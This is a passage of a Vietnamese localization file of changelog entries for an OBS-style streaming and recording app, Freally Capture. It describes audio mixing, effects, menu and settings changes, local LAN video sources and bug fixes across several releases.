tệp phần mới khi chuyển cảnh, khi thả một dấu chương, hoặc ở một bước của kịch bản chương trình. Mỗi phần bắt đầu chính xác tại ranh giới khung hình của sự kiện (độ dài tối thiểu một giây cho mỗi phần để một cơn bão sự kiện không thể tạo ra hàng loạt tệp vụn). Các vùng chứa phổ biến chỉ chia theo thời gian, điều này được nói rõ trong Cài đặt.","changelog.ef021f62a151":"<strong>Dấu đánh dấu tự động từ sự kiện (CAP-N44)</strong> — dấu chương được thả tự động bởi các sự kiện của studio — chuyển cảnh, lưu phát lại, kết nối lại luồng phát, các đợt rớt khung hình, cảnh báo được kích hoạt và các hành động của bộ quy tắc — mỗi dấu có nhãn theo loại, bên cạnh phím tắt đánh dấu thủ công sẵn có. Nhãn được đưa vào tiêu đề chương của mkv và tệp đi kèm <code>.chapters.txt</code>.","changelog.5e520f7a947e":"<strong>Chuỗi xử lý sau ghi hình (CAP-N45)</strong> — một chuỗi tác vụ sau khi ghi theo từng hồ sơ, lấy từ một tập hành động <strong>khép kín, chạy trong hộp cát</strong>: kiểm tra → remux sang MP4 → chuẩn hóa âm lượng → áp dụng quy tắc đặt tên → chuyển/sao chép vào thư mục → hiện trong trình quản lý tệp → báo cho script Lua. Chạy nền với chế độ xem hàng đợi trực tiếp; chuỗi dừng ở lỗi đầu tiên. Cố ý không có bước “chạy một lệnh”.","changelog.792a44452b11":"<strong>Trình kiểm tra tính toàn vẹn bản ghi (CAP-N46)</strong> — một lượt kiểm tra cục bộ nhanh (sau khi hoàn tất hoặc theo yêu cầu) kiểm tra cấu trúc vùng chứa, phần kết thúc hoàn tất, tính liên tục khung hình video, tính liên tục mẫu âm thanh theo từng rãnh, độ lệch xen kẽ hình/tiếng và thời lượng so với đồng hồ thực của trình ghi, rồi cho ra một báo cáo bằng ngôn ngữ dễ hiểu: OK / cảnh báo / thất bại. Định dạng <code>.frec</code> riêng được kiểm tra sâu; tệp định dạng phổ biến được quét cấu trúc + lỗi giải mã bằng ffmpeg một cách trung thực.","changelog.42ea336f6972":"<strong>Nguồn &amp; bộ đọc mã thời gian LTC (CAP-N47)</strong> — bộ tạo và bộ đọc mã thời gian tuyến tính SMPTE 12M riêng (mã thời gian âm thanh cổ điển, hoàn toàn ngoại tuyến). Tạo LTC lên một rãnh có thể gán của bàn trộn (ghi lại hoặc định tuyến ra thiết bị bên ngoài); đọc LTC đi vào từ bất kỳ đầu vào âm thanh nào để điều khiển một dòng mã thời gian in chìm trên lớp phủ thống kê hệ thống và các dấu chương có đóng dấu LTC. Khứ hồi chính xác tới ±1 khung hình ở 24/25/30 fps.","changelog.157723e79681":"<strong>Việc nhúng chương không còn bị suy giảm khi có bản ghi dọc chạy song song.</strong> Bước kiểm tra nhúng chương mkv giờ chỉ xét tệp của bản ghi chính, nên một tệp dọc (hoặc ISO) song song không còn đẩy một bản ghi mkv một tệp sang đường dùng tệp đi kèm.","changelog.8d45b8a98d91":"[0.500.0] — 2026-07-15 (Sản xuất âm thanh chuyên sâu — Giai đoạn 4)","changelog.b7c13c220405":"<em>Từ bàn trộn tới bàn điều khiển.</em> Giai đoạn 4 biến bàn trộn đã phát hành thành một bàn điều khiển phát sóng: định tuyến đầu ra vật lý và các bản trộn aux/cue, ma trận ducking N×M, bộ trộn tự động chia sẻ độ khuếch đại, chuẩn hóa độ to EBU R128 (bộ điều chỉnh trực tiếp + lượt xử lý sau ghi), EQ tham số với phổ trực tiếp, bộ khử tiếng xì và bộ lọc tiếng ầm, bảng âm thanh, ghi chỉ âm thanh (podcast), mix-minus cho từng khách mời với cấu hình sẵn chuỗi giọng nói một cú nhấp, và phần phát hiện + nền móng sạch giấy phép MIT cho việc chạy plugin CLAP <strong>và VST3</strong>. Mọi thứ đều là DSP cổ điển của riêng ứng dụng — không ML, theo đúng điều lệ — và tắt/trung tính theo mặc định, nên một bản trộn không động tới gì sẽ giống hệt từng bit như trước.","changelog.5159ad1b9251":"<strong>Bus aux &amp; định tuyến đầu ra vật lý (CAP-N30)</strong> — định tuyến bản trộn tổng hoặc bất kỳ bus nào trong sáu bus rãnh tới các thiết bị đầu ra vật lý bổ sung, mỗi đường có mức chỉnh riêng, từ ma trận <strong>Định tuyến</strong> (nút Định tuyến của Bàn trộn âm thanh). Một bus rãnh gửi tới tai nghe là một bản trộn cue khác với bản giám sát. Mặc định giữ đúng hành vi như hiện nay (chỉ bus giám sát tới được thiết bị).","changelog.d41c3c08bea2":"<strong>Ma trận ducking sidechain (CAP-N31)</strong> — một lưới <strong>Ducking</strong> hợp nhất cho biết ai làm nhỏ tiếng ai: bất kỳ nguồn nào cũng có thể làm nhỏ tiếng bất kỳ nhóm nào, mỗi cặp có độ sâu, ngưỡng, thời gian tấn công và nhả riêng. Bộ máy xếp chồng nhiều bộ ducking trên mỗi dải kênh, nên một dải kênh có thể bị nhiều trình kích hoạt làm nhỏ tiếng cùng lúc.","changelog.b732fddcfca9":"<strong>Bộ trộn tự động chia sẻ độ khuếch đại (CAP-N32)</strong> — một nút bật/tắt <strong>Tự động trộn</strong> kiểu Dugan trên mỗi dải kênh: trên tất cả các micrô được trộn tự động, tổng độ khuếch đại được giữ gần như không đổi và trao cho người đang nói (một quy tắc tổng độ khuếch đại bằng một có tính tất định), lý tưởng cho các buổi thảo luận nhiều người dẫn và podcast. Tắt theo mặc định.","changelog.ca003a06d04f":"<strong>Chuẩn hóa độ to EBU R128 (CAP-N34)</strong> — một <strong>bộ điều chỉnh độ to</strong> trực tiếp lái chương trình về một mức mục tiêu (−14 / −16 / −23 LUFS) với trần đỉnh, áp dụng lên bản trộn tổng và mọi bus rãnh để bản ghi và luồng phát có mức âm lượng nhất quán; cùng một thao tác <strong>Chuẩn hóa</strong> sau khi ghi trong danh sách bản ghi (ffmpeg <code>loudnorm</code>). Tắt theo mặc định.","changelog.01407091e030":"<strong>EQ tham số + chế độ xem phổ (CAP-N35)</strong> — một EQ tham số N băng (bell / low-shelf / high-shelf / notch / high-pass / low-pass) với <strong>các nút kéo được trên một bộ phân tích phổ trực tiếp</strong>; đường cong dùng đúng công thức RBJ mà bộ máy chạy. FFT của riêng ứng dụng; bộ phân tích chỉ hoạt động cho từng dải kênh khi trình chỉnh sửa đang mở.","changelog.42a294780d05":"<strong>Bộ khử tiếng xì + bộ lọc tiếng ầm (CAP-N36)</strong> — một <strong>Bộ khử tiếng xì (De-esser)</strong> tách băng (bộ phát hiện âm xì điều khiển một mức cắt high-shelf động, đúng pha, không ML) và một <strong>Bộ lọc tiếng ầm (Rumble Guard)</strong> cắt tần thấp bậc 2 sạch cho tiếng gõ bàn và âm bật hơi — cả hai đều là bộ lọc âm thanh thông thường.","changelog.29e99512428d":"<strong>Bảng âm thanh (CAP-N37)</strong> — một lưới phím chứa các đoạn âm thanh cục bộ với độ khuếch đại riêng cho từng phím, nhóm chặn (một phím mới dừng phím trước đó trong nhóm), lặp, phím tắt, gán rãnh và tùy chọn tự động làm nhỏ tiếng phần còn lại của bản trộn khi một phím đang phát. Các phím được giải mã qua thành phần ffmpeg được ghi rõ rồi vào bàn trộn như mọi nguồn khác.","changelog.251ef95cea94":"<strong>Ghi chỉ âm thanh (CAP-N38)</strong> — một <strong>chế độ podcast</strong> ghi <strong>WAV</strong> theo từng rãnh qua bộ ghi riêng của ứng dụng (hoàn toàn không khởi động bộ mã hóa video nào), tùy chọn chuyển mã sang <strong>FLAC/Opus</strong> qua thành phần ffmpeg được ghi rõ, với các dấu bỏ qua đoạn im lặng được ghi vào tệp đi kèm và mẫu tên tệp CAP-M25. Từ hộp thoại bản ghi.","changelog.d0ae0d751fe2":"<strong>Mix-minus cho từng khách mời &amp; cấu hình sẵn chuỗi giọng nói (CAP-N39)</strong> — <strong>cấu hình sẵn chuỗi giọng nói</strong> chỉ một cú nhấp (chuỗi phát sóng / podcast / sạch cổng→nén→EQ→giới hạn) áp dụng cho bất kỳ dải kênh nào, và một đường trả <strong>Mix-minus (N−1)</strong> riêng cho từng nguồn (mọi người trong chương trình trừ nguồn đó) để khách mời từ xa không nghe thấy tiếng vọng.","changelog.d1c450a7bdfb":"<strong>Plugin âm thanh — phát hiện CLAP + VST3 (CAP-N33)</strong> — một bảng <strong>Plugin</strong> tìm các plugin <strong>CLAP và VST3</strong> đã cài của bạn trong các thư mục chuẩn (phải tự bật, chỉ thư mục cục bộ, không tải gì về). Cả hai định dạng đều theo giấy phép MIT, sạch chi phí $0; việc chạy trực tiếp sẽ đặt mỗi plugin trong một tiến trình cô lập khỏi sự cố với giao diện riêng — phần tích hợp tiến trình chủ đó đang được thực hiện và bảng này nói rõ kế hoạch thay vì giả vờ có một nút bật/tắt.","changelog.1002a64a6813":"<strong>Trực quan hóa bộ lọc trực tiếp (điểm nhấn plugin)</strong> — mọi bộ lọc âm thanh giờ là một công cụ trực quan khi trình chỉnh sửa của nó đang mở: một <strong>đường cong truyền</strong> cho các bộ xử lý động (compressor / limiter / gate) với tín hiệu trực tiếp chạy trên đường cong, một <strong>đường cong đáp ứng tần số</strong> cho các bộ lọc âm sắc (EQ / khử tiếng xì / lọc tiếng ầm), hoặc một chỉ số mức cho các bộ lọc còn lại — mỗi thứ đặt cạnh <strong>đồng hồ vào / ra / giảm độ khuếch đại</strong> chuyển động theo âm thanh, cùng phong cách bộ phân tích tối bóng bẩy như EQ tham số.","changelog.5fbac10a716a":"<strong>Lối tắt trên màn hình nền khi cài trên Windows</strong> — MSI giờ tạo một lối tắt <strong>Freally Capture</strong> trên màn hình nền (bị xóa khi gỡ cài đặt).","changelog.2a6141e43be0":"Đã thay đổi","changelog.015b6bb3a57b":"<strong>VST3 giờ theo giấy phép MIT.</strong> Steinberg đã cấp phép lại SDK VST 3.8 theo MIT vào <strong>2025-10-29</strong>, nên ghi chú trước đây “VST3 là GPLv3 hoặc độc quyền, không tương thích” đã được sửa trong <code>vst.rs</code>, <code>claphost.rs</code> và <code>THIRD-PARTY-NOTICES.md</code> — VST3 giờ là một hướng plugin sạch chi phí $0, ngang hàng với CLAP.","changelog.eaa014cf0965":"[0.400.0] — 2026-07-15 (Bộ ghép hình &amp; hiệu ứng chuyên sâu — hoàn tất Giai đoạn 3)","changelog.c2a0fb6beabd":"Nửa sau của Giai đoạn 3 mang tới năm tính năng chuyển động và hiệu ứng đã bị hoãn, hoàn tất giai đoạn này: <strong>chuyển cảnh di chuyển (morph)</strong>, <strong>quy tắc chuyển cảnh</strong>, <strong>studio shader</strong> cho hiệu ứng WGSL của người dùng, trình chỉnh sửa <strong>mặt nạ Bézier</strong>, và <strong>stinger có track matte</strong> với tùy chọn làm nhỏ tiếng âm thanh chương trình. Cùng một bản sửa cho hai liên kết trong menu Trợ giúp vốn không làm gì cả.","changelog.9b85d048fa23":"<strong>Chuyển cảnh di chuyển (morph) (CAP-N20)</strong> — một kiểu chuyển cảnh mới: các mục xuất hiện ở <em>cả</em> cảnh đi lẫn cảnh đến (cùng nguồn) sẽ chuyển động từ vị trí/tỷ lệ/góc xoay/vùng cắt cũ sang mới thay vì cắt; các mục chỉ có ở một cảnh sẽ hiện dần hoặc mờ dần. Được làm mượt bằng hàm smootherstep để chuyển động tăng tốc lúc đầu và êm dần lúc cuối.","changelog.ccf72b961a2f":"<strong>Quy tắc chuyển cảnh (CAP-N21)</strong> — một ma trận chuyển cảnh theo từng cặp cảnh (<strong>Công cụ → Quy tắc chuyển cảnh…</strong>): cảnh A→B có thể dùng kiểu và thời lượng riêng thay vì mặc định. Cùng với <strong>hiện dần khi hiện/ẩn</strong> cho từng mục (Chỉnh sửa biến đổi… → Hé lộ): một mục sẽ hiện dần lên khi được bật hiển thị. Mọi chuyển cảnh hòa trộn và di chuyển giờ đều được làm mượt.","changelog.cd2edf9cde0e":"<strong>Studio shader (CAP-N22)</strong> — viết một <strong>hiệu ứng WGSL của riêng bạn</strong> làm bộ lọc: nó được biên dịch và xác thực lúc chạy (một shader không hợp lệ sẽ bị bỏ qua — nguồn hiển thị không qua bộ lọc, không bao giờ gây sự cố), với các thanh trượt được tạo tự động từ chú thích <code>// @param</code>, chỉnh sửa trực tiếp, và một thư viện có sẵn (thang xám, đảo màu, đường quét, viền tối).","changelog.51dd65cc8ab0":"<strong>Mặt nạ Bézier (CAP-N28)</strong> — một bộ lọc <strong>mặt nạ vẽ tay</strong>: vẽ một đường khép kín (kéo các tay nắm, nhấp đúp để thêm, nhấp phải để xóa), với các hình dạng có sẵn, làm mềm riêng từng cạnh và đảo ngược. Xuất bất kỳ đường nào thành mẫu <strong>gạt luma</strong> thang xám cho một chuyển cảnh hé lộ theo hình dạng.","changelog.1e693f57a778":"<strong>Stinger có track matte (CAP-N29)</strong> — một stinger có thể mang độ trong suốt của nó dưới dạng <strong>Track matte</strong> (phần lấp đầy và matte được xếp <strong>Cạnh nhau</strong> hoặc <strong>Xếp chồng</strong>), để alpha theo từng điểm ảnh trụ được qua các codec làm mất nó (H.264/HEVC). Tùy chọn <strong>làm nhỏ tiếng âm thanh chương trình</strong> dưới âm thanh riêng của stinger trong lúc nó phát.","changelog.646680d87464":"<strong>Trợ giúp → Truy cập trang web và Cổng trợ giúp không làm gì cả.</strong> Các liên kết menu này (và cũng các liên kết đó trong hộp thoại Giới thiệu) dựa vào việc webview mở <code>target=&quot;_blank&quot;</code>, điều mà bản dựng Tauri này không bao giờ làm. Giờ chúng mở trình duyệt của hệ điều hành qua trình mở đã được kiểm duyệt của ứng dụng — <strong>Truy cập trang web</strong> → trang chủ, <strong>Cổng trợ giúp</strong> → trang tài liệu.","changelog.e322c5f672ae":"[0.310.0] — 2026-07-14 (Bộ ghép hình &amp; hiệu ứng chuyên sâu — Giai đoạn 3, phần 1)","changelog.2d984c4daa81":"Nửa đầu của Giai đoạn 3 (Bộ ghép hình &amp; hiệu ứng chuyên sâu): chuyển động và hiệu ứng đến với khung vẽ — các kiểu làm mờ mới, nghiêng 3D, đóng băng khung hình, nhân bản nguồn chỉ một cú nhấp, và các <strong>Keyer đầu ra</strong> kiểu phát sóng nằm trên mọi cảnh. Cùng ba bản sửa lỗi được báo cáo với 0.301.0 — trong đó có một lỗi máy chiếu có thể khóa cả màn hình nền.","changelog.dbef37c22c9b":"<strong>Họ làm mờ (CAP-N27)</strong> — bốn bộ lọc GPU mới bên cạnh làm mờ Gaussian: <strong>theo hướng</strong> (vệt chuyển động theo một góc), <strong>xuyên tâm</strong> (xoay quanh một tâm), <strong>Thu phóng</strong> (vệt dolly-zoom) và <strong>Điểm ảnh hóa</strong> (khảm). Mỗi bộ lọc là một lượt đơn được lên kế hoạch, có các bài kiểm thử khung hình chuẩn.","changelog.1647ee3fae6b":"<strong>Biến đổi 3D / phối cảnh (CAP-N23)</strong> — một mục có thể nghiêng trong không gian 3D: <strong>Nghiêng X</strong>, <strong>Nghiêng Y</strong> và độ mạnh <strong>Phối cảnh</strong> trong hộp thoại Chỉnh sửa biến đổi. Một biến đổi thông thường (không nghiêng) cho ra kết quả giống hệt từng điểm ảnh — ma trận chiếu chỉ được dùng khi có áp dụng nghiêng.","changelog.ebaba11b62a2":"<strong>Bộ lọc đóng băng khung hình (CAP-N25)</strong> — thêm bộ lọc <strong>Đóng băng</strong> vào một nguồn và nó sẽ giữ khung hình cuối cùng; chương trình, bản xem trước, bản ghi và luồng phát đều đóng băng cùng lúc. Bật/tắt nó để bỏ đóng băng.","changelog.e1ac0ba4a7ba":"<strong>Nhân bản nguồn (CAP-N26)</strong> — nút <strong>Nhân bản</strong> trên mỗi hàng nguồn (⧉): một tín hiệu, nhiều diện mạo. Cùng một nguồn có thể nằm trong nhiều cảnh/vị trí, mỗi mục có biến đổi và chuỗi bộ lọc riêng (bộ máy vốn đã gắn bộ lọc theo từng mục; tính năng này biến việc đó thành một cú nhấp).","changelog.d223f64ff4d4":"<strong>Keyer đầu ra (CAP-N24)</strong> — các lớp phủ cố định được ghép trên <strong>Đầu ra chương trình</strong>, phía trên mọi cảnh, tồn tại qua các lần cắt cảnh (logo đài, huy hiệu TRỰC TIẾP, dòng chữ chân màn hình). Một bảng <strong>Công cụ → Keyer đầu ra…</strong> mới quản lý chúng: thêm bất kỳ nguồn nào, sắp xếp lại, độ mờ đục, vị trí/kích thước, bật/tắt từng lớp. Chúng được hiển thị như nhau trong bản xem trước, bản ghi, luồng phát và đa màn hình giám sát.","changelog.c53ca5aa04c7":"<strong>Có gì mới</strong> giờ mở nhật ký thay đổi của bản dựng đang chạy <strong>ngay trong ứng dụng</strong> (cùng chế độ xem ghi chú chỉ đọc mà trình cập nhật dùng) thay vì một thẻ trình duyệt — ngoại tuyến, và luôn là đúng ghi chú đã được phát hành.","changelog.a41f1b775b16":"<strong>Hiển thị dung lượng đĩa trong dock Thống kê</strong> — ô <strong>Đĩa</strong> trực tiếp cho biết dung lượng trống trên ổ ghi, và trong khi ghi, ô <strong>Ghi còn lại</strong> ước tính thời gian cho tới khi ổ đầy theo tốc độ ghi hiện tại (cùng phép ước tính trung thực, có tính đến <code>.frec</code> mà cảnh báo sắp hết dung lượng đĩa dùng). Nhờ vậy bạn thấy còn bao nhiêu chỗ trống khi ghi hoặc phát.","changelog.266a45108853":"<strong>Mở máy chiếu làm đóng băng cả màn hình nền.</strong> Việc mở máy chiếu trên một màn hình đã yêu cầu hệ điều hành cấp chế độ toàn màn hình độc quyền <em>trong lúc tạo cửa sổ</em> trên màn hình chính, gây bế tắc vòng lặp sự kiện của Windows — màn hình nền bị khóa cứng và phải buộc tắt ứng dụng từ Trình quản lý tác vụ. Giờ máy chiếu là một <strong>cửa sổ không viền có kích thước bằng màn hình đã chọn</strong> (đúng bản chất của “máy chiếu toàn màn hình” trong OBS): không chuyển chế độ DWM, và Esc / Alt+F4 / thanh tác vụ đều vẫn hoạt động.","changelog.5f6fa8c04556":"<strong>Việc nhập cảnh từ OBS không chọn đúng camera.</strong> Một Thiết bị ghi hình video được nhập từ OBS rơi vào “(thiết bị hiện tại)” mà không có gì được chọn — trình nhập đã bỏ hoàn toàn thiết bị của OBS. Giờ nó mang theo tên thiết bị dễ đọc của OBS và phân giải tên đó thành camera của máy này khi nhập.","changelog.7dca8f4d0d7f":"[0.301.0] — 2026-07-14 (Thanh menu &amp; hộp thoại Cài đặt)","changelog.080821dda5da":"Khung giao diện ứng dụng máy tính, theo dáng OBS nhưng là của riêng Freally: một <strong>thanh menu</strong> thật trên cùng và một <strong>hộp thoại Cài đặt có thanh bên</strong> với OK / Hủy / Áp dụng — để dock Điều khiển trở lại là các điều khiển trực tiếp thay vì một bức tường nút mở hộp thoại.","changelog.8a7238deca0a":"<strong>Thanh menu ứng dụng</strong> — Tệp · Chỉnh sửa · Xem · Dock · Hồ sơ · Bộ sưu tập cảnh · Công cụ · Trợ giúp, chạy ngang phía trên cửa sổ. Đây thuần túy là một lớp điều phối trên các thao tác vốn đã có (của bảng lệnh), nên không có gì mới xảy ra bên dưới — các nút mở hộp thoại giờ chỉ có chỗ ở mới. Tệp dẫn tới Hiện bản ghi / Remux / Cài đặt / Hiện thư mục cài đặt / Thoát; Chỉnh sửa có hoàn tác-làm lại và sao chép/dán biến đổi &amp; bộ lọc; Công cụ tập hợp tự động hóa, kịch bản chương trình, bản đồ phím tắt, đồng bộ hình-tiếng, script, thành phần, MIDI, PTZ, API điều khiển từ xa và bảng LAN; Hồ sơ và Bộ sưu tập cảnh chuyển giữa các bộ đã lưu; Trợ giúp mở tài liệu, nhật ký thay đổi, báo cáo lỗi và kiểm tra cập nhật. Các menu thả xuống điều hướng được bằng bàn phím (phím mũi tên giữa các menu và trong từng menu) và có nhãn cho trình đọc màn hình; các mục cho tính năng chưa có vẫn hiện nhưng bị vô hiệu.","changelog.0a8800013b15":"<strong>Hộp thoại Cài đặt kiểu OBS</strong> — một thanh bên bên trái chứa các danh mục (<strong>Chung · Giao diện · Phát trực tiếp · Đầu ra · Phát lại · Phím tắt · Mạng · Trợ năng · Giới thiệu</strong>) với một ngăn được nhóm, cuộn được và chân hộp thoại <strong>OK / Hủy / Áp dụng</strong>. <strong>Không có gì thay đổi cho đến khi bạn bấm Áp dụng (hoặc OK):</strong> hộp thoại chỉnh sửa trên một bản sao riêng, nút Áp dụng bị làm mờ cho đến khi bạn thực sự thay đổi điều gì đó, và Hủy/Escape khôi phục chính xác những gì bạn đã có — giao diện và màu nhấn được xem trước trực tiếp khi hộp thoại mở nhưng sẽ hoàn nguyên khi hủy, không để lại dấu vết. Lỗi của từng danh mục hiện ngay tại chỗ kèm một dấu chấm ở mục tương ứng trên thanh bên.","changelog.0b27c918454f":"<strong>Gán phím tắt chống xung đột</strong> — danh mục Phím tắt gán mọi thao tác từ một <strong>danh sách thả xuống gồm các phím tắt được chọn lọc</strong>, không phải ô nhập chữ. Chọn một phím tắt cho một thao tác sẽ gỡ nó khỏi menu của mọi thao tác khác, nên hai tính năng không bao giờ giữ cùng một phím; <strong>Không</strong> bỏ gán và trả phím về danh sách chung. Một ô lọc thu hẹp danh sách. Việc nhập chữ tự do đã bị loại bỏ hoàn toàn, và phần backend giờ từ chối các tổ hợp phím sai định dạng ngay ở cấp cấu trúc, nên một cách gán vô nghĩa không thể được lưu kể cả khi sửa tay.","changelog.757f7265a0b3":"<strong>Trợ năng: màu đồng hồ đo của bàn trộn</strong> — danh mục Trợ năng mới đặt màu các dải của đồng hồ VU, với một <strong>cấu hình sẵn an toàn cho người mù màu</strong> (Okabe-Ito) bên cạnh Mặc định và tùy chọn Tùy chỉnh.","changelog.bc44a26e0073":"<strong>Lối tắt tới thư mục</strong> — Tệp → Hiện bản ghi / Hiện thư mục cài đặt mở các thư mục của chính ứng dụng trong trình duyệt tệp (một lệnh của riêng ứng dụng, không bao giờ là một đường dẫn thô từ webview).","changelog.a8559338a320":"<strong>Dock Điều khiển giờ chỉ còn là điều khiển.</strong> Cả 18 nút mở hộp thoại (Cài đặt, Đầu ra, Phát, Dock, Hồ sơ, Script, Tự động hóa, Báo lỗi, Kiểm tra cập nhật, …) đã chuyển vào thanh menu; dock chỉ giữ những gì điều khiển buổi phát — Bắt đầu/Dừng ghi, Phát trực tiếp, Bật phát lại, nút khẩn cấp, Chế độ Studio, chuyển cảnh. Lời nhắc báo cáo sự cố và có bản cập nhật vẫn hiện khi khởi động y như trước.","changelog.2ce026bd331e":"[0.300.1] — 2026-07-14 (Lượt đơn giản hóa của Giai đoạn 2)","changelog.82f024d54659":"Không có tính năng mới: một đợt rà soát dọn dẹp từ bốn góc độ (tái sử dụng / đơn giản hóa / hiệu quả / tầm mức) cho bộ thay đổi 0.300.0, đã được áp dụng. Một bản sửa lỗi nhìn thấy được đi kèm: <strong>bộ ghép mặt hiển thị của lớp phủ thao tác nhập</strong> vẫn dùng phép hòa trộn alpha trước khi sửa, nên viền ký tự vẽ trên vùng trong suốt hơi bị tối — giờ nó dùng chung <code>compose::blit</code> đã được sửa với mọi nguồn có mặt hiển thị khác.","changelog.5d482d56004f":"<strong>Dùng chung những gì 0.300.0 đã xây rồi lại bỏ qua.</strong> Bốn phép blit alpha tự viết giờ gọi cùng một bộ ghép hình; việc kẹp vị trí tua, giải mã mẫu âm thanh và bộ giám sát tiến trình con chỉ còn nằm một chỗ trong <code>media.rs</code> (media, danh sách phát, phát lại và nhận luồng LAN đều dùng chúng); bốn sổ đăng ký phiên yếu giờ là một <code>WeakRegistry</code>; ngữ pháp <code>{{variable}}</code> là MỘT hàm duy nhất dùng chung cho tiêu đề và bộ máy tự động hóa (chúng không còn có thể lệch nhau); biểu mẫu nhận luồng LAN, bộ vẽ mã QR, giá trị mặc định của lớp tiêu đề và các bảng tùy chọn là những mô-đun giao diện dùng chung duy nhất; phép dò IP trong LAN, bộ mã hóa JPEG của bên gửi Link và việc xáo trộn danh sách phát đều gọi các hàm trợ giúp vốn đã có thay vì mang theo bản sao.","changelog.9f9c71653770":"<strong>Vệ sinh thời gian thực.</strong> Điểm lấy tín hiệu cho trình hiển thị của bàn trộn không còn cấp phát cho mỗi khối 10 ms; bên gửi Freally Link ghi khung hình theo kiểu header rồi payload thay vì sao chép mọi khung hình JPEG của chương trình vào một bộ đệm trung gian; đồng hồ bấm giờ từng chặng tính cột so sánh một lần mỗi phiên thay vì mỗi lần vẽ lại; bước kiểm tra trạng thái nhận luồng LAN thôi chuyển lại id nguồn thành chuỗi ở mỗi khung hình được rút ra.","changelog.b393d51bd0f8":"Nhiều phần thừa không dùng tới đã bị gỡ bỏ (một trường gamepad không được đọc, các derive không dùng, các hàm trợ giúp công khai quá mức) và phần mở đầu/thăm dò đối số ffmpeg được loại bỏ trùng lặp bên trong mô-đun giải mã — các lệnh giống hệt từng byte, chỉ được khai báo một lần.","changelog.b1d50dd41d90":"<strong>Trình cài đặt Windows giờ tạo lối tắt trên màn hình nền.</strong> Mẫu NSIS của Tauri chỉ tạo mục trong menu Start và không có tùy chọn lối tắt trên màn hình nền, nên chưa lần cài đặt nào đặt biểu tượng lên màn hình nền — các hook của trình cài đặt giờ tạo <code>Freally Capture.lnk</code> (với biểu tượng riêng của ứng dụng) ở mỗi lần cài đặt và xóa nó khi gỡ cài đặt.","changelog.45faf29e220b":"<strong>Giờ có thể xóa đường gióng chỉ bằng một cú nhấp.</strong> Việc gỡ một đường gióng từng đồng nghĩa với kéo một đường rộng 1 điểm ảnh ra khỏi khung vẽ — một thao tác đòi hỏi độ chính xác, mà trượt tay thì lại bắt đầu kéo một mục (khi đó các đường bắt dính màu đỏ tươi lại trông như “một đường gióng mới vừa xuất hiện”, theo một báo cáo thực tế). Thanh công cụ đường gióng có thêm nút <strong>Xóa tất cả đường gióng</strong>, và vùng bắt quanh mỗi đường gióng được nới rộng.","changelog.cb705b484db4":"[0.300.0] — 2026-07-14 (Nguồn &amp; lớp phủ mới — CAP-N Giai đoạn 2)","changelog.3d36dd2cf7da":"<strong>Mười thứ mới để đặt lên khung vẽ — tất cả đều cục bộ.</strong> Phát lại tức thì đưa bộ đệm <em>vào</em> chương trình, danh sách phát media liền mạch thay thế nguồn media “mỗi lần một tệp”, tiêu đề và bảng tỷ số có một trình thiết kế nhiều lớp thực thụ với điều khiển trực tiếp, và khung vẽ có thêm trình hiển thị âm thanh, HUD hiệu năng, đồng hồ bấm giờ từng chặng cho speedrun, lớp phủ thao tác nhập và hiệu ứng con trỏ. Hai nguồn LAN hoàn thiện bộ này: một trình lắng nghe SRT/RTMP để điện thoại hoặc máy tính thứ hai có thể cấp tín hiệu cho một cảnh, và <strong>Freally Link</strong>, một cách chia sẻ riêng giữa hai phiên bản ứng dụng mà không cần ffmpeg ở cả hai đầu.","changelog.a446e2cc5c22":"<strong>Bất biến về mạng vẫn được giữ:</strong> cả hai tính năng LAN đều <strong>tắt cho đến khi bạn thêm chúng</strong>, chỉ gắn với máy cục bộ và không bao giờ chạm tới internet. Không có gì tự dò tìm, không có gì tự kết nối ra ngoài, và ứng dụng nói rõ điều đó bằng mọi ngôn ngữ. Lớp phủ thao tác nhập và hiệu ứng con trỏ chỉ đọc thao tác nhập <strong>khi đang được bật</strong> và không bao giờ ghi nhật ký hay lưu trữ một lần gõ phím nào.","changelog.69585a9a3335":"<strong>Nguồn phát lại tức thì</strong> (CAP-N10). Đưa bộ đệm phát lại đã bật thẳng vào chương trình: một phím tắt chụp lại N giây gần nhất (sao chép luồng — không mã hóa lại) và phát chúng ở 100 / 50 / 25 %, <strong>được giãn thời gian, không bao giờ nội suy khung hình</strong>. Tua và tạm dừng trong khi phát; khi kết thúc, nguồn trở lại trong suốt, nên chương trình tự quay về trực tiếp. <em>Chuyển động chậm cố ý không có tiếng — âm thanh bị giãn thời gian sẽ bị nhòe, và chúng tôi không làm giả.</em>","changelog.beabb5e2e26f":"<strong>Nguồn nhận luồng LAN</strong> (CAP-N11). Một <strong>trình lắng nghe SRT/RTMP</strong> có sẵn: trỏ bất kỳ ứng dụng camera trên điện thoại, bộ mã hóa hay máy tính thứ hai nào tới URL (kèm mã QR) và tín hiệu đó vào một cảnh với dải kênh riêng trên bàn trộn. Tắt cho đến khi được thêm, chỉ gắn với máy cục bộ, không bao giờ ra internet. SRT có mật khẩu tùy chọn (AES); <em>RTMP không có cơ chế xác thực riêng — biểu mẫu nói rõ điều đó và ưu tiên SRT.</em>","changelog.26a004c0fb53":"<strong>Freally Link</strong> (CAP-N12). Hai phiên bản Freally trong cùng một mạng LAN: bật đầu ra Link trên máy gửi và đặt <strong>Khóa ghép nối</strong> của nó (không thể bật đầu ra nếu không có khóa), bấm <strong>Quét mạng LAN</strong> trên máy nhận, nhập khóa, và chương trình xuất hiện như một nguồn — từ máy chơi game sang máy mã hóa, hoặc một màn hình cho phòng phụ. Một máy nhận không xuất trình được khóa sẽ không bao giờ thấy một khung hình nào (so sánh trong thời gian không đổi, báo lỗi “bị từ chối” trung thực thay vì một vòng lặp thử lại). Một giao thức truyền tự viết của riêng ứng dụng và cơ chế dò tìm mDNS: <strong>không cần ffmpeg ở cả hai đầu</strong>, không có máy môi giới, không có máy chủ.","changelog.d57b39d01af7":"<strong>Nguồn lớp phủ thao tác nhập</strong> (CAP-N13). Hiển thị trực tiếp bàn phím, chuột và gamepad với bốn bố cục (WASD, bàn phím gọn, tay cầm hai cần, cần điều khiển đối kháng 8 hướng) — phím được nhấn sẽ sáng lên, cú nhấp chuột lóe sáng, cần và cò chuyển động. <strong>Chỉ đọc thao tác nhập khi nguồn đang được bật, và không bao giờ ghi nhật ký hay lưu trữ bất cứ thứ gì.</strong> Bàn phím/chuột ưu tiên Windows trước (được nói rõ ngay trong sản phẩm); gamepad hoạt động trên cả ba hệ điều hành.","changelog.230d75e66779":"<strong>Nguồn lớp phủ thống kê hệ thống</strong> (CAP-N14). Những <em>con số đo thực tế</em> của dock thống kê — fps, CPU, bộ nhớ, thời gian ghép hình trên GPU, số khung hình bị rớt và bitrate trực tiếp — 